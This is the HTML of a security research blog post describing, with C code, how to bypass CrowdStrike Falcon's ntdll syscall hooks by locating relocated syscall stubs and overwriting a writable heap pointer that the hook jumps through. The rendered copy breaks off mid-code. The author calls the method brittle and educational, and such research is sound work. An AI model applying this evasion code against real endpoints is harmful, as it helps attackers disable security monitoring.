<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>EDR Unhooking: Patching Falcon hooks without VirtualProtect | Inbits Blog</title><meta name=keywords content><meta name=description content="I recently encountered a blog post by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby hook jumps implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for NtAllocateVirtualMemory, which the authors unhook by replacing the EDR&rsquo;s hook with their own hook pointing to the relocated stub. Once they&rsquo;ve unhooked this function, it can be leveraged for the further unhooking of other functions."><meta name=author content="Tom Brice"><link rel=canonical href=https://inbits-sec.com/posts/in-memory-unhooking/><link crossorigin=anonymous href=/assets/css/stylesheet.min.a8c7cefc3a1d5f4123aa17c5c746a0d812ed0907d1aba94226bb35d21671a605.css integrity="sha256-qMfO/DodX0EjqhfFx0ag2BLtCQfRq6lCJrs10hZxpgU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://inbits-sec.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://inbits-sec.com/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://inbits-sec.com/favicon-32x32.png><link rel=apple-touch-icon href=https://inbits-sec.com/apple-touch-icon.png><link rel=mask-icon href=https://inbits-sec.com/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="EDR Unhooking: Patching Falcon hooks without VirtualProtect"><meta property="og:description" content="I recently encountered a blog post by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby hook jumps implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for NtAllocateVirtualMemory, which the authors unhook by replacing the EDR&rsquo;s hook with their own hook pointing to the relocated stub. Once they&rsquo;ve unhooked this function, it can be leveraged for the further unhooking of other functions."><meta property="og:type" content="article"><meta property="og:url" content="https://inbits-sec.com/posts/in-memory-unhooking/"><meta property="og:image" content="https://inbits-sec.com/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-07T23:52:33+01:00"><meta property="article:modified_time" content="2023-07-07T23:52:33+01:00"><meta property="og:site_name" content="Inbits"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://inbits-sec.com/"><meta name=twitter:title content="EDR Unhooking: Patching Falcon hooks without VirtualProtect"><meta name=twitter:description content="I recently encountered a blog post by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby hook jumps implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for NtAllocateVirtualMemory, which the authors unhook by replacing the EDR&rsquo;s hook with their own hook pointing to the relocated stub. Once they&rsquo;ve unhooked this function, it can be leveraged for the further unhooking of other functions."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://inbits-sec.com/posts/"},{"@type":"ListItem","position":2,"name":"EDR Unhooking: Patching Falcon hooks without VirtualProtect","item":"https://inbits-sec.com/posts/in-memory-unhooking/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"EDR Unhooking: Patching Falcon hooks without VirtualProtect","name":"EDR Unhooking: Patching Falcon hooks without VirtualProtect","description":"I recently encountered a blog post by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby hook jumps implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for NtAllocateVirtualMemory, which the authors unhook by replacing the EDR\u0026rsquo;s hook with their own hook pointing to the relocated stub. Once they\u0026rsquo;ve unhooked this function, it can be leveraged for the further unhooking of other functions.","keywords":[],"articleBody":"I recently encountered a blog post by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby hook jumps implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for NtAllocateVirtualMemory, which the authors unhook by replacing the EDR’s hook with their own hook pointing to the relocated stub. Once they’ve unhooked this function, it can be leveraged for the further unhooking of other functions.\nFor my own education and curiosity, I was keen to try out this approach with another EDR, Crowdstrike Falcon. I found that the hooking implementation of Falcon posed more challenges than that of Sophos (probably unsurprisingly), but with some hacky alternative approaches, I was able to achieve similar unhooking of NTDLL syscall stubs without VirtualProtect/NtAllocateVirtualMemory, or loading a fresh copy of ntdll.dll.\nTwo notes before I go through the approach:\nThis was a fun challenge, but I don’t think the result is really a practical approach - as will likely become apparent when looking at the steps. This is extremely targeted to a specific unhooking implementation, is not robust, and would just break if any part of the hooking implementation changed. I’m going to just brush over the initial custom GetModuleHandle/GetProcAddress that are used to locate the function we want to unhook. These are pretty widely covered elsewhere - so much so that they trigger ML detections and need little extra work to not be flagged. Finding the relocated syscall stub. So the first thing we need to do is find the relocated syscall stub. In the Signal Labs blog, they find that the hooked functions start with a direct jmp instruction, followed by an indirect jmp instruction that lands in the EDR’s DLL. Once landed in this DLL, a pointer is loaded into rax which is then jumped to, leading to the relocated syscall stub.\nUnfortunately in the case of Falcon, the stub wasn’t quite so straightforward to find. As an example we’ll have a look at trusty old NtProtectVirtualMemory.\nThe hook starts in the expected way. The initial mov r10,rcx call is still there, but followed by a jmp where an unhooked function would usually expect the syscall SSN to be moved into eax.\nFollowing the jump takes us to another address in the .text section of ntdll.dll where we find a series of push rcx instructions, before an indirect jump is made to the Falcon DLL.\nWhen we land in the DLL, there are 3 instructions before making another jump. The first instruction takes a value and stores it in the r10 register, the second moves another value from memory into eax, and the final instruction XORs the r10 value with a third value in memory.\nWe jump to an address just a little bit above where we previously were. Here we find a loop, which we’ll come back to later, that modifies the value in r10. After the loop has finished, a value is loaded from an offset of r10 and jumped to - and at this point, we’ll stop following the jumps.\nUnlike the Sophos example, we don’t quickly encounter a jump that leads to the relocated syscall stub here, so what other options do we have?\nWell, we know what address the relocated syscall stub is going to jump back to at some point… the address that follows the location of the original hook. We can just search through the relevant sections of allocated memory looking for that address - it’s crude, but works.\nImplementation So to start with, once we’ve got the address of the ntdll.dll function using some version of GetModuleHandle/GetProcAddress, we can check whether it is likely to be hooked by the presence of a jmp following the initial mov r10, rcx. We don’t know what type of jmp might be used, so we account for the range of jmp opcodes.\nVOID * FindHook(VOID * pFunc, LPCSTR pFuncName) { BYTE * firstByte = (BYTE *) pFunc; // Crude check for mov r10,rcx to determine whether function is syscall stub, or fully implemented in module if ( *firstByte != 0x4c || *(firstByte + 1) != 0x8b || *(firstByte + 2) != 0xd1 ) { printf(\"[!] Unexpected bytes found at function starting at: %p\\n\", pFunc); return NULL; } BYTE * fourthByteAddr = firstByte + 3; if ( *fourthByteAddr == 0xeb || *fourthByteAddr == 0xe9 || *fourthByteAddr == 0xff || *fourthByteAddr == 0xea ) { return fourthByteAddr; } else { return NULL; } } We then need to resolve the jmp to know where it lands, and also grab the address of the instruction after the jmp, which will be the address that we are searching for in memory. We can combine these into a more generic function that can be reused for later jumps.\nVOID * ResolveJmp(BYTE * jmpAddr, VOID ** nextInstructionOut) { BYTE jmpOp = *jmpAddr; if (jmpOp == 0xe9) { BYTE * nextInstruction = jmpAddr + 5; DWORD offset = *((DWORD *) (jmpAddr + 1)); if (nextInstructionOut != NULL) { *nextInstructionOut = nextInstruction; } return nextInstruction + offset; } if (jmpOp == 0xff) { VOID * nextInstruction = jmpAddr + 6; VOID * addr = (VOID *) *((DWORDLONG *) nextInstruction); if (nextInstructionOut != NULL) { *nextInstructionOut = nextInstruction; } return addr; } // Other jmp opcodes... return NULL; } Now we know the address that the relocated stub is going to be jumping back to, we can search for it using VirtualQueryEx, looping over the pages within the virtual address space. We want to narrow things down a bit, so we can limit our search to memory that is MEM_COMMIT, MEM_PRIVATE, and PAGE_EXECUTE_READ (these were confirmed for Falcon just using a debugger).\nWe have to make sure at least that the section is committed and readable, otherwise we’ll be dereferencing a null pointer and causing an error. The jmp to the address we are searching for is going to be in the middle of the relocated syscall stub, so we need to walk backwards to locate the initial mov r10, rcx that should indicate the start. We can return the SSN (it’s not used later but could be useful if we instead opted to direct syscall), and also the base address of the relocated stub. This will be where our patch would want to jmp to.\nWORD FindRelocatedStub(VOID * addrToFind, VOID ** unhookAddr) { MEMORY_BASIC_INFORMATION info; for ( BYTE * p = NULL; VirtualQueryEx(GetCurrentProcess(), p, \u0026info, sizeof(info)) == sizeof(info); p += info.RegionSize ) { // Memory sections we want to include. In the example case, the section is COMMITTED/PRIVATE/RX if (info.State != MEM_COMMIT || info.Type != MEM_PRIVATE || info.Protect != PAGE_EXECUTE_READ) { continue; } for (SIZE_T i = 0; i \u003c (info.RegionSize - sizeof(VOID *)); i++) { VOID * checkBytes = (VOID *) *((DWORDLONG *) ((BYTE *) info.BaseAddress + i)); if (checkBytes == addrToFind) { BYTE * finalJmpAddr = (BYTE *) info.BaseAddress + i; // Only walk back 100 bytes. If it's not found within that, we are probably in the wrong place. for (int backCounter = 1; backCounter \u003c 100; backCounter++) { if ( *((BYTE *) finalJmpAddr - backCounter) == 0x4c \u0026\u0026 *((BYTE *) ((finalJmpAddr - backCounter) + 1)) == 0x8b \u0026\u0026 *((BYTE *) ((finalJmpAddr - backCounter) + 2)) == 0xd1 ) { *unhookAddr = (BYTE *) finalJmpAddr - backCounter; WORD syscallID = *(WORD *)((BYTE *) ((finalJmpAddr - backCounter) + 4)); return syscallID; } } } } } return NULL; } Where can we patch? So hopefully now we know the address of the relocated stub. But what can we actually patch in order to jump there? Back in the Signal Labs post, they simply mention “replacing the hooks from the EDR/AV with our own hook.” In my case though, I found that this wasn’t possible. The initial hooks are located in the .text section of ntdll.dll, which isn’t writable without calling VirtualProtect first. The existing hooks were also E9 near jumps, which wouldn’t put us in range of our relocated stub, and I don’t believe we would be able to patch in a far jump without mangling surrounding instructions.\nWell, what about second jmp the hook goes to? That one is a far jump. Again though, this is still located inside the .text section of ntdll.dll and isn’t writable. The third jmp after this is located inside the Falcon DLL itself, and also isn’t writable, as well as being a short jump. The fourth jump is interesting though - it is also located in the DLL .text section, so isn’t directly writable, but it’s jumping to a register, r10, and as we briefly covered early, this register is filled with a value from memory that undergoes some modification before being jumped to.\nLet’s cover again what’s happening at this point:\nAfter following the first jmp in the hook, we land amongst some push rcx instructions. Through testing, I found that different function hooks land in different places in the series of push rcx instructions, varying the final address they jump to. We then jmp again to a few instructions where r10 is filled with a value from memory, and then is XOR’d with another value from memory. The resulting value is an address that is generally somewhere in some heap memory of the Falcon DLL. We jmp again and land in a loop, showed in the image above. This loop performs one iteration for every rcx value that was pushed to the stack after the first jmp. For every iteration of the loop, the value 0x45 is added to the address in r10. At the end of the loop, we jmp to r10 + 0x28. The final memory address that is loaded into the jmp is a section of heap memory, and happens to be writable. We can therefore work out where this address is by programmatically performing the steps listed above, writing our relocated stub address to the address we calculate, and the jmp r10 + 0x28 will naturally jump to the relocated stub, load the SSN into eax, and jump back to after the hook.\nOur function needs to:\nFollow the first jmp Count how many push rcx are performed Follow the second jmp Perform the XOR between the two values to get our initial stack address Add 0x45 for however many push rcx we counted Add 0x28 to account for the final addition in the jump Write the address we found for the relocated stub to here BOOL PatchHeapAddr(BYTE * landingAddr, VOID * targetAddr) { DWORD_PTR * patchAddr = NULL; BYTE * nextLanding = NULL; BYTE * nextInstruction = NULL; BYTE * initialHeapAddr = NULL; VOID * xorAddr1 = NULL; VOID * xorAddr2 = NULL; DWORD offset = 0; int stackValCounter = 0; // Count how many pushes to the stack are made before the jump while (*landingAddr == 0x51) { stackValCounter++; landingAddr++; } nextLanding = ResolveJmp(landingAddr, NULL); if (nextLanding == NULL) { return FALSE; } // Find the starting value of the heap address, pre-modification by the loop // To do this we find the value moved into r10. This is the address of the next instruction + an offset offset = *((DWORD *) (nextLanding + 3)); nextInstruction = nextLanding + 7; xorAddr1 = (VOID *) *((DWORDLONG *) (nextInstruction + offset)); // We then find the next value, which will be XOR'd with the first. We skip an instruction in the middle which isn't used in resolving the address. // Then it is also a case of the next instruction + an offset nextInstruction = nextInstruction + 6; offset = *((DWORD *) (nextInstruction + 3)); nextInstruction = nextInstruction + 7; xorAddr2 = (VOID *) *((DWORDLONG *) (nextInstruction + offset)); // XORing the two values gives us the initial address on the heap, before any modifications initialHeapAddr = ((DWORDLONG) xorAddr1) ^ ((DWORDLONG) xorAddr2); // We then perform the same actions the loop does, adding 0x45 for each value previously pushed to the stack, and adding 0x28 on the end. patchAddr = initialHeapAddr + (0x45 * (stackValCounter)) + 0x28; *patchAddr = targetAddr; return TRUE; } And at this point, we should have successfully unhooked the function without using VirtualProtect.\nAs mentioned already, this is obviously incredibly brittle because it’s reversing a specific piece of obfuscation where any of the hardcoded values could easily change. We could dynamically resolve the value added in the loops and the final jump, in case it was changed. Obligatory mention that nowadays of course user-land API hooking is just one part of the picture for modern EDRs, and isn’t going to be sufficient for evasion on its own. Another note is that this has only been tested on a couple of different instances of Falcon but all within the same organisation - it may well be the case that the hardcoded values used to unhook actually differ in different deployments.\nDemo and code Here’s a video demo where the unhooking is performed, and execution is stepped through with a debugger to confirm that the unhook works. Link to PoC repo: https://github.com/inb1ts/birdnet-poc\n","wordCount":"2171","inLanguage":"en","datePublished":"2023-07-07T23:52:33+01:00","dateModified":"2023-07-07T23:52:33+01:00","author":{"@type":"Person","name":"Tom Brice"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://inbits-sec.com/posts/in-memory-unhooking/"},"publisher":{"@type":"Organization","name":"Inbits Blog","logo":{"@type":"ImageObject","url":"https://inbits-sec.com/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://inbits-sec.com/ accesskey=h title="Inbits Blog (Alt + H)">Inbits Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://inbits-sec.com/about/ title="about me"><span>about me</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>EDR Unhooking: Patching Falcon hooks without VirtualProtect</h1><div class=post-meta><span title='2023-07-07 23:52:33 +0100 BST'>July 7, 2023</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Tom Brice</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#finding-the-relocated-syscall-stub aria-label="Finding the relocated syscall stub.">Finding the relocated syscall stub.</a><ul><li><a href=#implementation aria-label=Implementation>Implementation</a></li></ul></li><li><a href=#where-can-we-patch aria-label="Where can we patch?">Where can we patch?</a><ul><li><a href=#demo-and-code aria-label="Demo and code">Demo and code</a></li></ul></li></ul></div></details></div><div class=post-content><p>I recently encountered a <a href=https://signal-labs.com/analysis-of-edr-hooks-bypasses-amp-our-rust-sample/ target=_blank rel=noopener>blog post</a> by Signal Labs about using in-memory disassembly to perform EDR unhooking. In the post, the authors outline a technique whereby hook jumps implemented by Sophos are followed in order to find the relocated original syscall stub. This is first done for <code>NtAllocateVirtualMemory</code>, which the authors unhook by replacing the EDR&rsquo;s hook with their own hook pointing to the relocated stub. Once they&rsquo;ve unhooked this function, it can be leveraged for the further unhooking of other functions.</p><p>For my own education and curiosity, I was keen to try out this approach with another EDR, Crowdstrike Falcon. I found that the hooking implementation of Falcon posed more challenges than that of Sophos (probably unsurprisingly), but with some hacky alternative approaches, I was able to achieve similar unhooking of NTDLL syscall stubs <strong>without <code>VirtualProtect/NtAllocateVirtualMemory</code></strong>, or loading a fresh copy of <code>ntdll.dll</code>.</p><p>Two notes before I go through the approach:</p><ol><li>This was a fun challenge, but I don&rsquo;t think the result is really a practical approach - as will likely become apparent when looking at the steps. This is extremely targeted to a specific unhooking implementation, is not robust, and would just break if any part of the hooking implementation changed.</li><li>I&rsquo;m going to just brush over the initial custom <code>GetModuleHandle/GetProcAddress</code> that are used to locate the function we want to unhook. These are pretty widely covered elsewhere - so much so that they trigger ML detections and need little extra work to not be flagged.</li></ol><h2 id=finding-the-relocated-syscall-stub>Finding the relocated syscall stub.<a hidden class=anchor aria-hidden=true href=#finding-the-relocated-syscall-stub>#</a></h2><p>So the first thing we need to do is find the relocated syscall stub. In the Signal Labs blog, they find that the hooked functions start with a direct <code>jmp</code> instruction, followed by an indirect <code>jmp</code> instruction that lands in the EDR&rsquo;s DLL. Once landed in this DLL, a pointer is loaded into <code>rax</code> which is then jumped to, leading to the relocated syscall stub.</p><p>Unfortunately in the case of Falcon, the stub wasn&rsquo;t quite so straightforward to find. As an example we&rsquo;ll have a look at trusty old <code>NtProtectVirtualMemory</code>.</p><p>The hook starts in the expected way. The initial <code>mov r10,rcx</code> call is still there, but followed by a <code>jmp</code> where an unhooked function would usually expect the syscall SSN to be moved into <code>eax</code>.</p><p><img loading=lazy src=/hooked_NtProtectVirtualMemory.png#center alt=hooked-ntprotectvirtualmemory></p><p>Following the jump takes us to another address in the <code>.text</code> section of <code>ntdll.dll</code> where we find a series of <code>push rcx</code> instructions, before an indirect jump is made to the Falcon DLL.</p><p><img loading=lazy src=/first_jmp_landing.png#center alt=first-jmp-landing></p><p>When we land in the DLL, there are 3 instructions before making another jump. The first instruction takes a value and stores it in the <code>r10</code> register, the second moves another value from memory into <code>eax</code>, and the final instruction XORs the <code>r10</code> value with a third value in memory.</p><p><img loading=lazy src=/second_jmp_landing.png#center alt=second-jmp-landing></p><p>We jump to an address just a little bit above where we previously were. Here we find a loop, which we&rsquo;ll come back to later, that modifies the value in <code>r10</code>. After the loop has finished, a value is loaded from an offset of <code>r10</code> and jumped to - and at this point, we&rsquo;ll stop following the jumps.</p><p><img loading=lazy src=/third_jmp_landing.png#center alt=third-jmp-landing></p><p>Unlike the Sophos example, we don&rsquo;t quickly encounter a jump that leads to the relocated syscall stub here, so what other options do we have?</p><p>Well, we know what address the relocated syscall stub is going to jump <strong>back</strong> to at some point&mldr; the address that follows the location of the original hook. We can just search through the relevant sections of allocated memory looking for that address - it&rsquo;s crude, but works.</p><h3 id=implementation>Implementation<a hidden class=anchor aria-hidden=true href=#implementation>#</a></h3><p>So to start with, once we&rsquo;ve got the address of the <code>ntdll.dll</code> function using some version of <code>GetModuleHandle/GetProcAddress</code>, we can check whether it is likely to be hooked by the presence of a <code>jmp</code> following the initial <code>mov r10, rcx</code>. We don&rsquo;t know what type of <code>jmp</code> might be used, so we account for the range of <code>jmp</code> opcodes.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>VOID <span style=color:#f92672>*</span> <span style=color:#a6e22e>FindHook</span>(VOID <span style=color:#f92672>*</span> pFunc, LPCSTR pFuncName) {
</span></span><span style=display:flex><span>    BYTE <span style=color:#f92672>*</span> firstByte <span style=color:#f92672>=</span> (BYTE <span style=color:#f92672>*</span>) pFunc;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Crude check for mov r10,rcx to determine whether function is syscall stub, or fully implemented in module
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>firstByte <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x4c</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>(firstByte <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0x8b</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>(firstByte <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0xd1</span>
</span></span><span style=display:flex><span>    ) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[!] Unexpected bytes found at function starting at: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, pFunc);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    BYTE <span style=color:#f92672>*</span> fourthByteAddr <span style=color:#f92672>=</span> firstByte <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>fourthByteAddr <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xeb</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>fourthByteAddr <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xe9</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>fourthByteAddr <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xff</span> <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>fourthByteAddr <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xea</span>
</span></span><span style=display:flex><span>    ) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> fourthByteAddr;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We then need to resolve the <code>jmp</code> to know where it lands, and also grab the address of the instruction after the <code>jmp</code>, which will be the address that we are searching for in memory. We can combine these into a more generic function that can be reused for later jumps.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>VOID <span style=color:#f92672>*</span> <span style=color:#a6e22e>ResolveJmp</span>(BYTE <span style=color:#f92672>*</span> jmpAddr, VOID <span style=color:#f92672>**</span> nextInstructionOut) {
</span></span><span style=display:flex><span>    BYTE jmpOp <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>jmpAddr;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (jmpOp <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xe9</span>) {
</span></span><span style=display:flex><span>        BYTE <span style=color:#f92672>*</span> nextInstruction <span style=color:#f92672>=</span> jmpAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>;
</span></span><span style=display:flex><span>        DWORD offset <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((DWORD <span style=color:#f92672>*</span>) (jmpAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (nextInstructionOut <span style=color:#f92672>!=</span> NULL) {
</span></span><span style=display:flex><span>            <span style=color:#f92672>*</span>nextInstructionOut <span style=color:#f92672>=</span> nextInstruction;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> nextInstruction <span style=color:#f92672>+</span> offset;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (jmpOp <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xff</span>) {
</span></span><span style=display:flex><span>        VOID <span style=color:#f92672>*</span> nextInstruction <span style=color:#f92672>=</span> jmpAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>        VOID <span style=color:#f92672>*</span> addr <span style=color:#f92672>=</span> (VOID <span style=color:#f92672>*</span>) <span style=color:#f92672>*</span>((DWORDLONG <span style=color:#f92672>*</span>) nextInstruction);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (nextInstructionOut <span style=color:#f92672>!=</span> NULL) {
</span></span><span style=display:flex><span>            <span style=color:#f92672>*</span>nextInstructionOut <span style=color:#f92672>=</span> nextInstruction;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> addr;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Other jmp opcodes...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Now we know the address that the relocated stub is going to be jumping back to, we can search for it using <code>VirtualQueryEx</code>, looping over the pages within the virtual address space. We want to narrow things down a bit, so we can limit our search to memory that is <code>MEM_COMMIT</code>, <code>MEM_PRIVATE</code>, and <code>PAGE_EXECUTE_READ</code> (these were confirmed for Falcon just using a debugger).</p><p>We have to make sure at least that the section is committed and readable, otherwise we&rsquo;ll be dereferencing a null pointer and causing an error. The <code>jmp</code> to the address we are searching for is going to be in the middle of the relocated syscall stub, so we need to walk backwards to locate the initial <code>mov r10, rcx</code> that should indicate the start. We can return the SSN (it&rsquo;s not used later but could be useful if we instead opted to direct syscall), and also the base address of the relocated stub. <strong>This will be where our patch would want to <code>jmp</code> to</strong>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>WORD <span style=color:#a6e22e>FindRelocatedStub</span>(VOID <span style=color:#f92672>*</span> addrToFind, VOID <span style=color:#f92672>**</span> unhookAddr) {
</span></span><span style=display:flex><span>    MEMORY_BASIC_INFORMATION info;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (
</span></span><span style=display:flex><span>        BYTE <span style=color:#f92672>*</span> p <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>VirtualQueryEx</span>(<span style=color:#a6e22e>GetCurrentProcess</span>(), p, <span style=color:#f92672>&amp;</span>info, <span style=color:#66d9ef>sizeof</span>(info)) <span style=color:#f92672>==</span> <span style=color:#66d9ef>sizeof</span>(info);
</span></span><span style=display:flex><span>        p <span style=color:#f92672>+=</span> info.RegionSize
</span></span><span style=display:flex><span>    ) {
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Memory sections we want to include. In the example case, the section is COMMITTED/PRIVATE/RX
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>if</span> (info.State <span style=color:#f92672>!=</span> MEM_COMMIT <span style=color:#f92672>||</span> info.Type <span style=color:#f92672>!=</span> MEM_PRIVATE <span style=color:#f92672>||</span> info.Protect <span style=color:#f92672>!=</span> PAGE_EXECUTE_READ) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (SIZE_T i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> (info.RegionSize <span style=color:#f92672>-</span> <span style=color:#66d9ef>sizeof</span>(VOID <span style=color:#f92672>*</span>)); i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>            VOID <span style=color:#f92672>*</span> checkBytes <span style=color:#f92672>=</span> (VOID <span style=color:#f92672>*</span>) <span style=color:#f92672>*</span>((DWORDLONG <span style=color:#f92672>*</span>) ((BYTE <span style=color:#f92672>*</span>) info.BaseAddress <span style=color:#f92672>+</span> i));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (checkBytes <span style=color:#f92672>==</span> addrToFind) {
</span></span><span style=display:flex><span>                BYTE <span style=color:#f92672>*</span> finalJmpAddr <span style=color:#f92672>=</span> (BYTE <span style=color:#f92672>*</span>) info.BaseAddress <span style=color:#f92672>+</span> i;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75715e>// Only walk back 100 bytes. If it&#39;s not found within that, we are probably in the wrong place.
